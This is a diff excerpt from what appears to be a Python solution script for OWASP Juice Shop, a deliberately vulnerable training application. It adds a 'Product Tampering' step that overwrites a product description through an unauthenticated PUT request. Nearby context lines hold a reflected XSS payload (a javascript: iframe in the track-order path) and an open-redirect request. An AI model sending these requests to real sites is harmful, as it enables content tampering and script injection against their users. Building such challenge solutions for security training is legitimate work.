@@ -21,6 +21,8 @@ requests.get(url+'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbL
 requests.get(url+'/assets/public/images/padding/81px.png')
 # ---- Privacy Policy Inspection (Prove that you actually read our privacy policy.)
 requests.get(url+'/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility')
+# ---- Product Tampering (Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.)
+requests.put(url+'/api/Products/9', data={'description':'<a href="https://owasp.slack.com" target="_blank">More...</a>'})
 # ---- Reflected XSS (Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">.)
 requests.get(url+'/rest/track-order/<iframe src="javascript:alert(`xss`)">')
 # ---- Repetitive Registration (Follow the DRY principle while registering a user.)
